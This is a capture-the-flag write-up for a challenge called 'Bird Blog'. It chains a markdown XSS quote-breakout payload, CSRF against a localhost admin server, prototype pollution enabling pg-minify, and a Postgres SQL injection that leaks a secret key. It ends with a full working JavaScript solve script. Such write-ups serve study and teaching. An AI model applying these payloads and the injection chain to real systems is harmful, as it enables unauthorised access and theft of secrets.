# Bird Blog

In this ctf challenge, the flag was locked behind a randomized secret_key. The only place the secret key was stored in was the Postgres DB. Admin server was localhost only, so only the bot could access it, and the bot only viewed markdown comments.


## Part 1: XSS
The first step was obviously XSS to get CSRF. This was pretty straighforward, we submit comments, comments get converted from markdown to HTML, and directly injected into HTML raw.

Although important chars were HTML escaped, this formatting was very suspicious -> 

```js
content = content.replace(/!\[([^\]]*)\]\((https?:\/\/[a-zA-Z0-9.-]+(?::\d+)?\/[^)]+)\)/g, (match, alt, url) => {
		try {
			const parsedUrl = new URL(url);
			return `<img src="${parsedUrl.href}" alt="${alt}">`;
		} catch {
			return match;
		}
	});
	content = content.replace(/\[([^\]]+)\]\((https?:\/\/[a-zA-Z0-9.-]+(?::\d+)?\/[^)]+)\)/g, (match, text, url) => {
		try {
			const parsedUrl = new URL(url);
			return `<a href="${parsedUrl.href}">${text}</a>`;
		} catch {
			return match;
		}
	});
```

Now the image and anchor tag both were placing regex matched groups inside quotes. A possibility arises that if we could place something that would match like an anchor link block inside the image src, the anchor tag's href would break OUT of the quotes into the img element!

For example - `![](https://a.test/a[x](http://x/onerror=x))` gets converted to `<img src="https://a.test/a[x](http://x/onerror=x" alt="">)` by image handler, then finally - `<img src="https://a.test/a<a href="http://x/onerror=x%22%20alt=%22%22%3E">x</a>` by anchor replacement.

The above might look a bit confusing, but after html parsing it creates an img element with src=`https://a.test/a<a href=`, and some junk attributes, and finally an onerror attribute with value `x%22%20alt=%22%22%3E&quot;`. The problem is we can't add brackets as they will mess with prior replacements. And we can't use backticks as well as they will start a code block.

So, we trigger `location = javascript:...` instead. To make RHS a string without quotes, i will just use /.../.source which basically parses it as regex as takes source of it, just another way to get string without quotes.

So alert triggering payload - `![](https://x/[x](http://x/onerror=location=/javascript:alert%281%29/.source//))`. Just modify it to atob+eval and load external script for sanity purpose.

## Part 2 - Prototype Pollution
Now we assume we can seemlessly interact with :8081 admin server. Analyzing configure.mjs, we can see it has - 

```js
navTree[superCategory] ??= {};
navTree[superCategory][subCategory] = [];
```

We control both superCategory and subCategory, so we have a limited prototype pollution of a random variable with value strictly `[]`. Ance since `[]` is truthy, it indicated that the next part would be finding some config param, which will alter the handling of postgres related queries. We will get back to it later.

## Part 3 - SQLi
During config, SQL files are "rendered" from Handlebar templates and saved. The sus part was the complex-ish function slugify. Interestingly, handlebars hook overrode the replacement regex with a missing /g flag. This meant that only first match of the regex will be neutralized. 

```js
let slug = text.split("").reduce((acc, cur) => {
		cur = anyascii(cur);
		return acc + cur.replace(/[^\w\s]/, "");
	}, "");
```

This meant that if anyascii outputs `\\` , the sluggify will make it `\`, and if it outputs `''`, it will make it `'`. So assume we can put *anything* through sluggify for once.

The blocker becomes this - 
```js
handlebars.registerHelper("sqlString", function (str) {
	return `'${str}'`.replace(/'/g, "''").slice(1, -1);
});
```
Every quote is doubled, which means, inserting a stray single quote in our payload won't work. Postgres, by default has `standard_conforming_strings` turned on, which means, `\` doesn't work as an escaping character inside a string, just as a literal. 

But remember, we still have our prototype injection, what if we could use that to flip some config?

## Part 4 - Enabling SQLi through Prototype Pollution
Next part was pure hunting through dependency code, so I specifically tasked the LLM to find all such config params which might effect how this sql is sent to postgres server. And it came back with this -  

QueryFile class of pg-promise
```js
if (options.minify && options.minify !== 'after') {
    i.sql = npm.minify(i.sql, {compress: options.compress});
}
```
Now the server didn't configure any options, so options.minify is undefined. If we make it true, our sql query will be "minified", or i.e. undergo some sort of mutation. This was promising. 

And after looking into pg-minify, it became clear that it did NOT follow `standard_conforming_strings`. So we can trick it into thinking that quote closed early and inject our payload!

We target archive sql file - 

```sql
WITH top_categories AS (
			VALUES
			{{#each topCategories}}
				({{ @index }}, {{{ sqlString (slugify name) }}}){{#unless @last}},{{/unless}}
			{{/each}}
		)
```

Our first two slugs are - `a\\'--x` and `||`, which get interpolated as - 

```sql
Values
        (0, 'a\''--x'),
        (1, '||'),
        (2, '||<payload>')
```

What happens is pg-minify will break out of quote and think `--` is start of comment, and delete it and strips newlines. So the output is - 

`VALUES (0, 'a\'' (1, '||'), (2, '||<payload>...`

Now postgres will think that 1st value is `a\'' (1, '), (2, '` (`||` combines). Finally, our payload is thrown into the open. We can run sql commands and the result of payload will be concatenated into response of 1st category.



## Part 5 - The Final Piece
The problems now at hand - 
 - The server restarts after applying configuration change. This resets our prototype pollution, and pg-minified won't be used.

Fix to this is easy, throw an error in configuration function. This line from hbs.js is perfect for it - 
```js
if (slug.includes("/")) throw new Error(`Invalid slug "${slug}" generated from "${str}"`);
```
To add a forward slash, we use `\u2052`, which sluggify outputs as `/.`. This will throw error and server restart won't be triggered.

- The new problem is that, the query files are cached in memory. Since admin bot visited the page on startup, even if we overwrite the sql file through config, it won't take affect till we restart the server.

For the final part, I just submitted a normal config once, and let the server restart to clear the cache, and since the admin bot is visiting on my comment, nothing will trigger rendering of :8080 page, so no caching. I then sent the malicious config to the server with crash prevention bit set. The sql file got overwritten with prototype pollution set, I visited the :8080 and the secret key was right there! Submitted it to flag server and got the flag


Final solve snippet (to be ran on bot session)
```js
(async () => {
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  if (location.hostname !== "localhost") {
    location.href = "http://localhost:8080" + location.pathname + location.search + location.hash;
    return;
  }

  const ADMIN = "http://localhost:8081";
  const CSRF_SECRET = "csrfsecret";
  const CSRF_SALT = "salt";

  async function sha256Hex(s) {
    const bytes = new TextEncoder().encode(s);
    const digest = await crypto.subtle.digest("SHA-256", bytes);
    return [...new Uint8Array(digest)].map((b) => b.toString(16).padStart(2, "0")).join("");
  }

  const csrfToken = `${CSRF_SALT};${await sha256Hex(`${CSRF_SALT}:${CSRF_SECRET}`)}`;
  document.cookie = `_csrf=${CSRF_SECRET}; Path=/configure; SameSite=Strict`;

  async function postConfigure(categories) {
    const body = new URLSearchParams({
      csrfToken,
      title: "Musings on Birds",
      theme: "raven",
      categories,
      inNavPosts: "",
    });

    try {
      await fetch(`${ADMIN}/configure`, {
        method: "POST",
        mode: "no-cors",
        credentials: "include",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body,
      });
    } catch {}
  }

  async function waitAdmin() {
    for (let i = 0; i < 100; i++) {
      try {
        await fetch(`${ADMIN}/configure`, {
          mode: "no-cors",
          credentials: "include",
          cache: "no-store",
        });
        return true;
      } catch {}
      await sleep(250);
    }
    return false;
  }

  function chrs(s) {
    return [...s].map((c) => `chr(${c.charCodeAt(0)})`).join("||");
  }

  //hardcoded transliterations of any-ascii
  const translit = {"(":"\u2e28",")":"\u226c","|":"\u2016","\\":"\u2cf9","'":"\u02ba",".":"\u0832",":":"\u0834","+":"\u2021","*":"\u156f","<":"\u00ab",">":"\u00bb","=":"\u2245","?":"\u203d","@":"\u1b7e","[":"\u23b6","]":"\u02ad","{":"\u29da","}":"\u29db","`":"\u02f5","~":"\u1fc1","!":"\u203c"};

  function idealToRaw(s) {
    let out = "";

    for (let i = 0; i < s.length; i++) {
      const c = s[i];

      if (c === "-" && s[i + 1] === "-") {
        out += "\u00b1 ";
        i++;
      } else if (/^[a-z0-9_]$/.test(c)) {
        out += c;
      } else if (translit[c]) {
        out += translit[c];
      } else {
        throw new Error(`No transliteration gadget for ${JSON.stringify(c)}`);
      }
    }

    return out;
  }

  const leakSql =
    "SELECT to_tsvector(encode(secret_key::bytea,'hex')) FROM secret_key";

  const jsonPrefix = '[{"slug":"x","name":"';
  const jsonSuffix = '","posts":[]}]';

  const expr =
    `jsonb(${chrs(jsonPrefix)}` +
    `||((ts_stat(${chrs(leakSql)})).word)||` +
    `${chrs(jsonSuffix)})`;

  const slug0 = "a\\'--x";
  const slug1 = "||";
  const slug2 = `||chr(120)))select(${expr})))posts--x`;

  const maliciousCategories = [
    "*" + idealToRaw(slug0),
    "*" + idealToRaw(slug1),
    "*" + idealToRaw(slug2),
    "*__proto__/minify",
    "\u2052", // to throw error
  ].join(",");

  //normal configure to clear cache of QueryFile
  await postConfigure(
    "*Birdwatching/Tips,*Birdwatching/Stories,*Species/Cardinals,*Species/Warblers,Migration"
  );

  await sleep(1200);
  await waitAdmin();
  await sleep(300);

  await postConfigure(maliciousCategories);
})();
```

Transliteration function is just to make life easier, so we could focus on writing sql and not fighting with sluggify.


# Waybird Machine
To be Added